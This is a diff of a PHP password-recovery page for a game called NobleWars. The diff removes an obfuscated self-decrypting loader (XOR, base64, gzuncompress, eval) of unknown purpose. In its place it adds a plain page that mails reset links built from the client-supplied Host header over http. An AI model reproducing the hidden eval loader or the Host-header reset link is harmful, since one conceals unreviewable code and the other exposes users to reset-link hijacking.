@@ -1,24 +1,94 @@
 <?php
-$ewckyygwe="e6596c0f7a7225d9548e7861147bb249";
-$mplopqxdcu="0754530a035352520e04020103055609070d0a50015a0f00555701545b02500a";
-$lzvhobyh="GrjbZd5euQItmyoT3vA0cRuMrOA9UjU4tk1+6vyoF2qO1H7RtVDGV6JIcJoVpXm7DPRM2XeYWwpARu1ku1JnuXsqQqLS9o2oypQtA3ckuCn5jL/X6680PPtJl7csGuG7xOf8uox5oIdmS3/ZtQYForbVZYOmZ/ZxCw2uZAtuGwBvEQcf3Vg0ne3HTCFcl6ArIaodri1mRurB5a+OHEvg3fWHEnlC25cfV+VQcdI+zGcOvjpw0QqLpbhmonqaWZJHeC2roKjO8dm9kz32DvbsPHU69NeuljB8np6yoVyCUBgjwyNQAI4mgcrd6ycCItO+eMqA7NzzKV6rCPDS6O56SnRlF8TmUEmZI4YvF4bSKKjlSEyfHVYhhAhX9AUYMSFlZY/dg2PXIRjJIdtrLIvMUAw4WUQNCTVfdQ4lT+pBT3n9q4YgoI7k+FQGGy4rj9RH1Kom+UsgUxLTXY2W4CU/J6SwLTR3gzAt6YigIXJanYhW6HnS9SfP+d/Klf89dOh2dsmqqUuYR9JyYIEdBcVV6xMtLdiWoEclX8jDuDj7tja1mpISHrTJhoo63an9lzjEb4qJACgu8UlUfTl5djgKgN6qOjkd7Tiiy21WEmdDVyzWYYI+pkdR4g3kKWard6VDQNv8ZEk+TkxTEuNjOBuKJK24Bkfyvlh6gWsY2BhGTaRyt2/+hLn/vAJ2m19K4KifordfAyj+hir4PObF+C8LNIFrXS15viw70EDs8NOWVZfRMG+AEYZledAz1Z+4e2IVh0dGYF2RhDmBnaSQQJdMcY8vaEnLeGT2RduQZBgfSZWm6aJ4cvE7KZfOpYGLohDdidOIHILBq4XcpVLAhCCXZTqStYfhZ2Dm+d9wd8FQM9l13gqpEtbxqys8F94quwcHWvp2osC4gKtWXUxAT0p+wEKvocJx4cowDdOWF0F6IvCBg+IP6uo/h56kYeGfIFllUsmE95WjneAen45namWqRxMB/J6tjCDWYFquxNfqQ9VZPwRoBiaVefMZG2kMFtuyYK9LEwRQkSRiGTHmANzl4MCsYhogEiJQIwdz+JfeSKuKh+0L691K9FTs6NJ5/zhcvqEOEBkdR8cItM9NdyYhllloT+WntQ6dyTWVUGoQXw0m5gBY9XGV1m16qHp3+T6CgttquikMrlHt/t2iC/gsma8KvPWIuSZQe/O+SMhAOmPzs62cm0dhPsfI48fehQC96QifyKY9N+767rAxwqNlyh+SQUpORopqIjFipWaAn8tqvNUCLOViLLScW78MWOb5KrEhkq8Lyk7lI3dORfgcnB9OoFE9K1J0fiSl/yALFi8T641ovOcCOcnriW3Kk9+1IU8R286hwsBn8Y3FT2I4ehrtCn1LEoWkby2wz+rv7c4YMUABcNzZ7tO2RoF4bciqwauXm1toRn/dAj7uO5+l79JRsDTilscS/J6rtiKjHNRE2ylTOPHV7/4sKhzYiydtZu6XkhMd7B+XFwn5agci5hWpkiu4tpWpJObsnFiHhXSM7sRJ6b7jpJY+YABsqsYXPKishXtH/aDGXuBQsXwnpv+zeFBbiQzChy9l6aEXmGmuobOutpqSJq3tpnNmJ3OmOKzzmPlg4ErRfXbuifIukxPN8OWgNJGkTb3de2rQy3PwR48WjYJrgwalUG5XP42HlNncq+E3F+jDL8OBqBM8MZXJbh2YPwJBpg7zE7A+RSb7qmxhtxyqSr93cSZVBdH3XHOegfDOC4rkv+FQIcRYaQPT2NrIREjmCQ4B0KocPjRcYzwAMX40/1V3eJjIBoLbbXUqapV1h87tOrwuhvixXm7qWACqaqz7brrXsYzc2TkGowMAWYcJzUYVahCLxI2Jwza19z8A";
-$zhbxdyob=file_get_contents(__FILE__);
-$loeqed=str_replace($lzvhobyh,"",$zhbxdyob);
-if(strpos($loeqed,"ec"."ho")!==false||strpos($loeqed,"pr"."int")!==false||strpos($loeqed,"var_"."dump")!==false||strpos($loeqed,"file_put_"."contents")!==false||strpos($loeqed,"fw"."rite")!==false){die();}
-$pvqxel=str_replace(array($ewckyygwe,$mplopqxdcu),array("SP_85a66cd9","KP_3b0a3f16"),$zhbxdyob);
-$wjhldkfin=md5($pvqxel);
-$jcsujjvy=hex2bin($mplopqxdcu);
-$cfchlxtzq="";
-$zfmaoyao=strlen($wjhldkfin);
-for($cgkmieq=0;$cgkmieq<$zfmaoyao;$cgkmieq++){
-$cfchlxtzq.=chr(ord($jcsujjvy[$cgkmieq])^ord($wjhldkfin[$cgkmieq]));
+session_start();
+require_once('configs/config.php');
+
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0)
+        return;
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+    if (file_exists($file))
+        require $file;
+});
+
+$conn = @mysqli_connect($conf['db_host'], $conf['db_user'], $conf['db_pass'], $conf['db_name']);
+if (!$conn)
+    die(__('stats.config_load_error') . ': ' . mysqli_connect_error());
+mysqli_set_charset($conn, 'utf8');
+mysqli_query($conn, "SET SESSION sql_mode = ''");
+
+// Load translation helpers
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+
+// Initialize language system
+init_locale();
+
+$message = '';
+$error = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = mysqli_real_escape_string($conn, trim($_POST['email'] ?? ''));
+
+    if (empty($email)) {
+        $error = __('public.password_recovery.error_empty_email');
+    } else {
+        // Check if email exists
+        $query = "SELECT id, nazwa FROM conta WHERE email = '$email' LIMIT 1";
+        $result = mysqli_query($conn, $query);
+
+        if ($result && mysqli_num_rows($result) > 0) {
+            $user = mysqli_fetch_assoc($result);
+
+            // Generate reset token
+            $token = bin2hex(random_bytes(32));
+            $expires = time() + 3600; // 1 hour
+            $created = time();
+
+            // Store token
+            $query = "INSERT INTO password_resets (user_id, token, expires, created_at) VALUES ('{$user['id']}', '$token', '$expires', '$created')
+                       ON DUPLICATE KEY UPDATE token = '$token', expires = '$expires', created_at = '$created'";
+            mysqli_query($conn, $query);
+
+            // Send recovery email
+            $resetLink = "http://" . $_SERVER['HTTP_HOST'] . "/reset_password.php?token=$token";
+            
+            $subject = "NobleWars - Recuperação de Senha";
+            
+            // Load secure HTML email template
+            $templateFunc = require(__DIR__ . '/../app/Views/emails/password_recovery.php');
+            $emailMessage = $templateFunc($user['nazwa'], $resetLink);
+
+            \App\Helpers\MailHelper::send($email, $subject, $emailMessage);
+
+            $message = __('public.password_recovery.success_sent');
+        } else {
+            $error = __('public.password_recovery.error_email_not_found');
+        }
+    }
 }
-$pusgihri=base64_decode($lzvhobyh);
-$wknvxrp=strlen($pusgihri);
-$rvjsejzie="";
-$gxdszmcfq=strlen($cfchlxtzq);
-for($cgkmieq=0;$cgkmieq<$wknvxrp;$cgkmieq++){
-$rvjsejzie.=$pusgihri[$cgkmieq]^$cfchlxtzq[$cgkmieq%$gxdszmcfq];
+
+// Navigation menu
+$linki = [
+    'index.php' => __('public.index.title'),
+    'rules.php' => __('public.rules.title'),
+    'team.php' => __('public.team.title'),
+    'hall_of_fame.php' => __('public.hall_of_fame.title'),
+    'help.php' => __('public.help.title'),
+];
+
+// Determinar tema atual (Decidido pelo Admin no config.php)
+$current_theme = $conf['index_theme'] ?? 'classic';
+
+mysqli_close($conn);
+
+// Carregar a vista correspondente
+if ($current_theme == 'modern') {
+    include __DIR__ . '/../app/Views/password_recovery_modern.php';
+} else {
+    include __DIR__ . '/../app/Views/password_recovery_classic.php';
 }
-$nmompk="gzun"."compress";
-eval($nmompk($rvjsejzie));
+?>
